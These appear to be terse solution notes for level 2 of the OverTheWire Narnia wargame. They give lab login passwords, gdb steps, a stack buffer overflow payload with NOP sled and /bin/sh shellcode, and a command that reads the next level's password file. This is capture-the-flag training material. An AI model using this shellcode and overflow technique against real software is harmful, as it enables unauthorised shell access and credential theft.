sftp -oPort=2226 narnia2@narnia.labs.overthewire.org
5agRAXeBdG
get /narnia/narnia2

sshpass -p '5agRAXeBdG' ssh narnia2@narnia.labs.overthewire.org -p 2226
cd /narnia
gdb-gef narnia2
disassemble main
# set breakpoint at strcpy
# b *0x********
run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*136)")
# find address of buffer
# 0xffffd541 -> \x41\xd5\xff\xff
delete 1
run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*98+b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'+b'\x41\xd5\xff\xff')")
# it will run the shellcode
# quit gdb and run the program
quit

# after quit gdb, u have to shift the address of buffer by 30? to get the shellcode working
./narnia2 $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*98+b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'+b'\x71\xd5\xff\xff')")

cat /etc/narnia_pass/narnia3
# password: 2xszzNl6uG